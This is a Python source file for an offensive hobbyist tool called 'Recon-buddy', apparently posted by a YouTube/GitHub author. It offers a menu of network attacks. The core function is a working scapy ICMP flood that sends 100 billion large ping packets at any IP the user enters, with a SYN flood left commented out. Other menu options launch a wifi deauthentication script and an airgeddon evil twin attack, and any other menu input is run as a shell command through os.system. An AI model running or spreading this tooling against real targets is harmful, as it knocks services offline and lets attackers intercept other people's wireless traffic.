#sambhu
#!/usr/bin/env python
# Recon-buddy
# By Cipar-root 
# subscribe youtube channale >  https://www.youtube.com/channel/UCPGHkifv3-1i8j7pHThSHzg/featured
# github > https://github.com/Dhanraj369?tab=repositories


	
import subprocess
import re
import csv
import os
import time
import shutil
from datetime import datetime
from scapy.all import *




#--------------------------------------------------------------------

def DossATK():
	

	def send_ping(target_ip_address: str, number_of_packets_to_send: int = 4, size_of_packet: int = 65000):
		ip = IP(dst=target_ip_address)
		icmp = ICMP()
		raw = Raw(b"X" * size_of_packet)
		p = ip / icmp / raw
		send(p, count=number_of_packets_to_send, verbose=0)
		print('send_ping(): Sent ' + str(number_of_packets_to_send) + ' pings of ' + str(size_of_packet) + ' size to ' + target_ip_address)


	#def send_syn(target_ip_address: str, target_port: int, number_of_packets_to_send: int = 4, size_of_packet: int = 65000):
	#	ip = IP(dst=target_ip_address)
	#	tcp = TCP(sport=RandShort(), dport=target_port, flags="S")
	#	raw = Raw(b"X" * size_of_packet)
	#	p = ip / tcp / raw
	#	send(p, count=number_of_packets_to_send, verbose=0)
	#	print('send_syn(): Sent ' + str(number_of_packets_to_send) + ' packets of ' + str(size_of_packet) + ' size to ' + target_ip_address + ' on port ' + str(target_port))


	ip=input("   enter IP address of target --# ")
	#port=input("   enter port number of target --#")

	#send_syn(ip, port, number_of_packets_to_send=10000000000)
	send_ping(ip, number_of_packets_to_send=100000000000)
	




def wifiDeauth():
	
	os.system("python3 Dos.py")







def darkweb():
	
	print("""   from here i am not responsible for any thng \n   on your side  """)

	ans=input("i understand tha risk --:#: [y/n]")

	if ans=="y":

		os.system("less tor.txt")

	if ans=="n":

		pass
	else:

		print("envalid.....")








def eviltwin():
	
	print("  Attansion :: please : you will not use it properly \n  Domt't miss use it \n    i am not resposible for damage occer by you from this action\n   do its on you own risk \n")

	risk=input("   you understand the risk and agry with condition above --# [yes/no]")

	if risk=="yes":



		print("   setting up envorment .....")

		print("   in case its shows [ some_package_name....not Ok ] \n   install it mannual way :: apt-get install  some_package_name\n   then re-run this option EVIL TWIN attack")
		os.system("airmon-ng start wlan0\n\n")


		print("*"*70)
		print("   let me clear you first your interfase \n   wlan0 will use for moniter mode \n   so, it become wlan0 to wlan0mon  \n   its is nessesry to put your wifi in moniter mode \n   so ,that attack will perform sucessfully.... \n    after quiting attack or exiting tool  \n    make sure you run command :: [ airmon-ng stop wlan0mon ] \n    in case process is not completed or you exit tool ... in middle of working\n ")
		print("*"*70)

		fin=input("yes i read all information and command above , i understand ::--# [y/n]")

		if fin=="y":
			for x in range(10000):
				print(" press ctr + c to break or exit \n   sleep for 10s for read")
				time.sleep(10)
				os.system("airgeddon")

		if fin=="n":
			
			exit()

		os.system("airmon-ng stop wlan0mon")


		

	if risk=="no":
		exit()









#------------------------------------------------------------------------------------------------------

logo=""" 
    ██████╗ ███████╗ ██████╗ ██████╗ ███╗   ██╗      ██████╗ ██╗   ██╗██████╗ 
    ██╔══██╗██╔════╝██╔════╝██╔═══██╗████╗  ██║      ██╔══██╗██║   ██║██╔══██╗
    ██████╔╝█████╗  ██║     ██║   ██║██╔██╗ ██║█████╗██████╔╝██║   ██║██║  ██║
    ██╔══██╗██╔══╝  ██║     ██║   ██║██║╚██╗██║╚════╝██╔══██╗██║   ██║██║  ██║
    ██║  ██║███████╗╚██████╗╚██████╔╝██║ ╚████║      ██████╔╝╚██████╔╝██████╔╝
    ╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═══╝      ╚═════╝  ╚═════╝ ╚═════╝ """

Contributors=["Cipar-root"]

display_info=f"""   =[ Reconn-buddy ]= 
   =[ Version: 1.0.2 ]= 
   =[ Contributors: [ {Contributors[:]} ]=
   =[ this tool use for [A]ttack [H]ide and [S]can and [S]niff ]=

   Enter number for choose :
     
     [1] Dos attack
     [2] wifi deauthentication attack
     [3] Dark web Links
     [4] Evil twin attack
     

   [ Linux command can be used here : e.i ls,clear , exit]"""



def setup():

	os.system("clear")
	print("╚═══╝"*16,end="\n\n")
	print(logo)
	print("╚══════╝"*10,end="\n\n")
	print(display_info)


def Anonymous():
	
	setup()

	os.system("clear")
	setup()
	while True:
		get_num=input("""┌──(Cipar-root💀recon-bud)-[/Offensive ]
└─# """)

		if get_num=="back":

			os.system("python3 startup.py") #startup file location
			exit()

		
		elif get_num==get_num and get_num != "exit" and get_num != "3" and get_num != "4" and get_num != "5" and get_num != "6" and get_num != "7" and get_num != "1" and get_num != "2" :

			os.system(get_num)
			if get_num=="clear":
				print(display_info)


		if get_num=="1":

			DossATK()

		if get_num=="2":
			
			wifiDeauth()

		if get_num=="3":
			
			darkweb()

		if get_num=="4":

			eviltwin()


